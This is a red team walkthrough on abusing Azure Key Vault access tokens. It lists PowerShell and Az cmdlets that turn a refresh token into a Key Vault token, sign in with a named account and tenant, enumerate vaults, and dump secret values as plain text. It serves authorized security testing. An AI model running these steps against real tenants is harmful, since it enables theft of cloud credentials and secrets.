# Red Team Walkthrough: Azure Key Vault Token Theft

## Overview

This walkthrough demonstrates how a Red Team operator can retrieve and
abuse Azure Key Vault tokens to enumerate and extract secrets. The
process leverages PowerShell scripts and Azure CLI commands, simulating
a typical attack scenario.

------------------------------------------------------------------------

## 1. Retrieve Key Vault Access Token

Run the following PowerShell script to generate a Key Vault Access Token
for Data Plan Access:

``` powershell
Get-AzureKeyVaultAccessTokenFromRefreshToken.ps1
```

This script outputs the token, which can be uploaded to tools like
GraphSpy for further analysis.

**Note:** The resource `cfa8b339-82a2-471a-a3c9-0fc0be7a4093` is the
Microsoft Azure Key Vault first-party application (service principal) in
Microsoft Entra ID.

------------------------------------------------------------------------

## 2. Authenticate with Key Vault Token

Use the access token to authenticate against Azure Key Vault:

``` powershell
Connect-AzAccount -AccessToken $ARM -KeyVaultAccessToken $KeyVaultAccessToken -AccountId javier.barrera@sitea.everlinesystems.com -Tenant 527c0d4b-2722-4f04-b9ed-7b13ed039ecb
```

------------------------------------------------------------------------

## 3. Enumerate Key Vaults and Secrets

List all accessible Key Vaults:

``` powershell
Get-AzKeyVault
```

Enumerate secrets within a specific vault:

``` powershell
Get-AzKeyVaultSecret -VaultName "kvbluerangesecrets"
```

Retrieve detailed information about a specific secret:

``` powershell
Get-AzKeyVaultSecret -VaultName "kvbluerangesecrets" -Name "AnotherSecret" | Format-List *
```

------------------------------------------------------------------------

## 4. Extract Secret Values

Take note of the secret ID for use in subsequent scripts.

Run the following script to obtain the secret value:

``` powershell
SecretValue.ps1
```

Update the URI in the script to match your secret ID.

------------------------------------------------------------------------

## 5. Native Method for Secret Retrieval

Alternatively, use PowerShell to extract the secret value directly:

``` powershell
$(Get-AzKeyVaultSecret -VaultName "kvbluerangesecrets" -Name "AnotherSecret").SecretValue | ConvertFrom-SecureString -AsPlainText
```

------------------------------------------------------------------------

## 6. Operational Notes

-   Always document the IDs and URIs used for secret retrieval\
-   Validate access permissions and monitor for unusual activity\
-   Use these techniques for authorized Red Team exercises only

------------------------------------------------------------------------

## References

-   AzureRedTeam/KeyVault/Get-AzureKeyVaultAccessTokenFromRefreshToken.ps1\
-   AzureRedTeam/KeyVault/SecretValue.ps1\
-   App id to Displayname - Microsoft Q&A
